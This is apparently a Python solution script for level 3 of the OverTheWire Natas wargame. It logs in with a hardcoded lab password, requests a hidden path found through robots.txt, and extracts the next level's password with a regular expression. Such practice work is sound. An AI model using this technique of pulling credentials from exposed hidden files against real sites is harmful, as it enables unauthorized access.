#!/user/bin/env python
import requests
import  re
username = 'natas3'
password = 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'
#url ='http://%s.natas.labs.overthewire.org/robots.txt' % username
url ='http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username
reponse = requests.get(url, auth=(username, password))
content = reponse.text

print (content)
print (re.findall('natas4:(.*)',content)[0])
